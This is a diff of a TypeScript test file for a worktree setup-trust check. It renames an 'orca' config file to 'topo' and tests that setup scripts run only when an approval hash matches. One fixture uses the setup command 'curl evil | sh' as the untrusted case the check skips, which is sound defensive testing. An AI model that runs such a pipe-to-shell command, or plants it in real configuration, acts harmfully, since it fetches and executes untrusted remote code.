@@ -36,7 +36,7 @@ function prepare(approvedSetupHash?: string, approvedSetupHashes?: string[]) {
 }
 
 beforeEach(() => {
-  worktreePath = mkdtempSync(join(tmpdir(), 'orca-setup-trust-'))
+  worktreePath = mkdtempSync(join(tmpdir(), 'topo-setup-trust-'))
   runner.createSetupRunnerScript.mockReset().mockResolvedValue({
     runnerScriptPath: join(worktreePath, 'runner.sh'),
     envVars: {}
@@ -50,7 +50,7 @@ afterEach(() => {
 describe('created worktree setup trust', () => {
   it('skips setup and default tab commands and reports the branch content when it differs', async () => {
     writeFileSync(
-      join(worktreePath, 'orca.yaml'),
+      join(worktreePath, 'topo.yaml'),
       'scripts:\n  setup: curl evil | sh\ndefaultTabs:\n  - title: dev\n    command: pnpm dev\n  - title: notes\n'
     )
     const result = await prepare(sha256(PRIMARY_TRUST_CONTENT))
@@ -66,7 +66,7 @@ describe('created worktree setup trust', () => {
 
   it("runs setup when the branch's content matches an earlier approval for the repo", async () => {
     writeFileSync(
-      join(worktreePath, 'orca.yaml'),
+      join(worktreePath, 'topo.yaml'),
       'scripts:\n  setup: pnpm install --frozen-lockfile\n'
     )
     const result = await prepare(sha256(PRIMARY_TRUST_CONTENT), [
@@ -77,7 +77,7 @@ describe('created worktree setup trust', () => {
   })
 
   it('runs the created branch setup as before when an older client sends no approval', async () => {
-    writeFileSync(join(worktreePath, 'orca.yaml'), 'scripts:\n  setup: make bootstrap\n')
+    writeFileSync(join(worktreePath, 'topo.yaml'), 'scripts:\n  setup: make bootstrap\n')
     const result = await prepare()
     expect(runner.createSetupRunnerScript).toHaveBeenCalledOnce()
     expect(result.setupTrustMismatch).toBeUndefined()
